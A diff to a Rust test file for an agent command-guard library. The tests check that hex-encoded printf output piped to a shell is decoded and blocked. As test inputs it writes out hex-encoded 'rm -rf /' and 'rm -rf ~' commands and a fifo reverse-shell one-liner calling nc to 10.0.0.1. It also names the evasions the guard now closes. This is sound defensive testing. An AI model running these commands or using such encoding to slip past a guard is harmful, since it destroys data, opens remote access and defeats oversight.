@@ -2,8 +2,9 @@
 //! evasions documented in the README "Known evasions" section.
 //!
 //! These assertions pin REALITY, not a desired outcome. As of v0.1.x the
-//! normalization pre-pass (`gate::normalize`) DELIBERATELY closes four forms —
-//! ANSI-C `$'...'`, echo/printf command-substitution verbs, IFS reassignment,
+//! normalization pre-pass (`gate::normalize`) DELIBERATELY closes five forms —
+//! ANSI-C `$'...'`, echo/printf command-substitution verbs, hex-encoded
+//! `printf '<\xHH…>'` piped to a shell (benchmark "hexesc"), IFS reassignment,
 //! and backslash line-continuation — so they now Block. The remaining forms are
 //! still parser-bounded out of scope; we pin the present verdict so that if a
 //! future change starts catching (or stops catching) one of them, this test
@@ -16,7 +17,7 @@
 //! substring/leg matching, not by deliberate construct handling; we pin that
 //! real behavior too and label it as incidental.
 
-use apohara_agentguard::config::Config;
+use apohara_agentguard::config::{CommunityPacksConfig, Config};
 use apohara_agentguard::gate::evaluate;
 use apohara_agentguard::verdict::Tier;
 
@@ -196,6 +197,82 @@ fn single_quoted_or_inert_substitution_allows() {
             evaluate(cmd, &Config::default()).tier,
             Tier::Allow,
             "single-quoted/inert substitution must Allow: `{cmd}`"
+        );
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Hex-encoded printf piped to a shell (benchmark "hexesc", QuasarNix m_hexesc)
+// ---------------------------------------------------------------------------
+
+/// Hexesc: every byte of a command becomes `\xHH` inside a single-quoted
+/// printf format whose leg pipes into `sh`. The normalize pre-pass decodes the
+/// leg-head invocation in place (pass 3), so the interpreter's input is what
+/// gets scanned -> now DELIBERATELY Blocks under the DEFAULT taxonomy.
+#[test]
+fn hexesc_printf_pipe_shell_blocks() {
+    // `rm -rf /`, full m_hexesc form.
+    let v = evaluate(
+        r"printf '\x72\x6d\x20\x2d\x72\x66\x20\x2f' | sh",
+        &Config::default(),
+    );
+    assert_eq!(
+        v.tier,
+        Tier::Block,
+        "NOW CAUGHT: hexesc printf|sh decodes to `rm -rf /`"
+    );
+
+    // `rm -rf ~` with a pathed shell target and mixed literal chars
+    // (`\x72\x6D\x20-rf ~` -> `rm -rf ~`; note printf consumes up to TWO hex
+    // digits per escape, so a literal char may not directly follow one).
+    let v = evaluate(r"printf '\x72\x6D\x20-rf ~' | /bin/sh", &Config::default());
+    assert_eq!(
+        v.tier,
+        Tier::Block,
+        "NOW CAUGHT: hexesc decode composes with pathed pipe target"
+    );
+}
+
+/// The QuasarNix reverse-shell fifo one-liner in its full hexesc form. Its
+/// decoded legs are covered by the opt-in `reverse-shell` COMMUNITY pack (the
+/// default taxonomy deliberately does not rank plain nc/mkfifo as destructive —
+/// see tests/community_packs.rs off-by-default invariant), so this pins the
+/// decode → pack wiring end to end: same verdict as the plain form.
+#[test]
+fn hexesc_reverse_shell_fifo_blocks_with_reverse_shell_pack() {
+    let raw = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.0.0.1 22 >/tmp/f";
+    let hx: String = raw.bytes().map(|b| format!("\\x{b:02x}")).collect();
+    let cmd = format!("printf '{hx}' | sh");
+
+    let cfg = Config {
+        community_packs: CommunityPacksConfig {
+            enabled: vec!["reverse-shell".to_string()],
+            dir: Some(std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("packs-community")),
+        },
+        ..Config::default()
+    };
+    assert_eq!(
+        evaluate(&cmd, &cfg).tier,
+        Tier::Block,
+        "hexesc-decoded fifo reverse shell must Block once the pack that covers \
+         its plain form is enabled"
+    );
+}
+
+/// FP control: printf with hex escapes NOT piped into a shell never executes
+/// the payload — it stays Allow even though the bytes look like an evasion.
+#[test]
+fn hexesc_printf_without_shell_pipe_stays_allow() {
+    let allow = [
+        r"printf '\x48\x65\x6c\x6c\x6f\n'",
+        r"echo $(printf '\x68\x69')",
+        r#"git commit -m "printf '\x72\x6d' | sh""#,
+    ];
+    for cmd in allow {
+        assert_eq!(
+            evaluate(cmd, &Config::default()).tier,
+            Tier::Allow,
+            "benign hexesc-shaped printf must Allow: `{cmd}`"
         );
     }
 }
